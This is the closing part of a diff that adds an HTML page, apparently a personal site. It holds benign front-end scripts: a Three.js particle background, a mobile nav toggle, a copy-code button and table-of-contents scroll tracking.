+    <a href="https://w4llz.me/" target="_blank"><i class="bi bi-globe2"></i> w4llz.me</a>
+  </div>
+</div>
+
+</div><!-- /.main -->
+</div><!-- /.page-wrap -->
+
+<!-- ══════════════════════════════ -->
+<!-- THREE.JS + SCRIPTS             -->
+<!-- ══════════════════════════════ -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script>
+// ─── Three.js Particle Background ───
+(function(){
+  const canvas=document.getElementById('bg-canvas');
+  const renderer=new THREE.WebGLRenderer({canvas,alpha:true,antialias:true});
+  renderer.setSize(window.innerWidth,window.innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio,2));
+
+  const scene=new THREE.Scene();
+  const camera=new THREE.PerspectiveCamera(60,window.innerWidth/window.innerHeight,0.1,1000);
+  camera.position.z=50;
+
+  const count=1800;
+  const geo=new THREE.BufferGeometry();
+  const pos=new Float32Array(count*3);
+  const cols=new Float32Array(count*3);
+  for(let i=0;i<count;i++){
+    pos[i*3]=(Math.random()-0.5)*120;
+    pos[i*3+1]=(Math.random()-0.5)*120;
+    pos[i*3+2]=(Math.random()-0.5)*120;
+    cols[i*3]=0.23;  // r
+    cols[i*3+1]=0.51; // g
+    cols[i*3+2]=0.96; // b — matches accent
+  }
+  geo.setAttribute('position',new THREE.BufferAttribute(pos,3));
+  geo.setAttribute('color',new THREE.BufferAttribute(cols,3));
+
+  const mat=new THREE.PointsMaterial({size:0.35,vertexColors:true,transparent:true,opacity:0.7,sizeAttenuation:true});
+  const pts=new THREE.Points(geo,mat);
+  scene.add(pts);
+
+  let mouseX=0,mouseY=0;
+  document.addEventListener('mousemove',e=>{mouseX=(e.clientX/window.innerWidth-0.5)*2;mouseY=(e.clientY/window.innerHeight-0.5)*2});
+
+  function animate(){
+    requestAnimationFrame(animate);
+    pts.rotation.y+=0.0004;
+    pts.rotation.x+=0.0002;
+    camera.position.x+=(mouseX*3-camera.position.x)*0.02;
+    camera.position.y+=(-mouseY*3-camera.position.y)*0.02;
+    camera.lookAt(scene.position);
+    renderer.render(scene,camera);
+  }
+  animate();
+
+  window.addEventListener('resize',()=>{
+    camera.aspect=window.innerWidth/window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth,window.innerHeight);
+  });
+})();
+
+// ─── Mobile Nav Toggle ───
+function toggleMobileNav(){
+  document.getElementById('mobileOverlay').classList.toggle('show');
+  document.getElementById('mobilePanel').classList.toggle('show');
+}
+
+// ─── Copy Code ───
+function copyCode(btn){
+  const block=btn.closest('.code-block');
+  const code=block.querySelector('code');
+  navigator.clipboard.writeText(code.textContent).then(()=>{
+    btn.textContent='Copied!';
+    setTimeout(()=>btn.textContent='Copy',1500);
+  });
+}
+
+// ─── TOC Active Scroll Tracking ───
+(function(){
+  const tocLinks=document.querySelectorAll('.toc a');
+  const sections=[];
+  tocLinks.forEach(link=>{
+    const id=link.getAttribute('href').slice(1);
+    const el=document.getElementById(id);
+    if(el)sections.push({el,link});
+  });
+
+  const observer=new IntersectionObserver(entries=>{
+    entries.forEach(entry=>{
+      if(entry.isIntersecting){
+        tocLinks.forEach(l=>l.classList.remove('active'));
+        const match=sections.find(s=>s.el===entry.target);
+        if(match)match.link.classList.add('active');
+      }
+    });
+  },{rootMargin:'-20% 0px -75% 0px'});
+
+  sections.forEach(s=>observer.observe(s.el));
+})();
+</script>
+</body>
+</html>
